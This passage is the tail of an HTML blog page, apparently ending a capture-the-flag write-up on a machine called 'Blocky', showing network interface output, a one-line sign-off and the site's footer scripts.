+          RX bytes:903090767 <span class="o">(</span>903.0 MB<span class="o">)</span>  TX bytes:2521630482 <span class="o">(</span>2.5 GB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:30180 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:30180 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:2400568 <span class="o">(</span>2.4 MB<span class="o">)</span>  TX bytes:2400568 <span class="o">(</span>2.4 MB<span class="o">)</span>
+</code></pre></div></div> <p><br> And with that, we conquered the Blocky ender dragon. See you in the next one.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
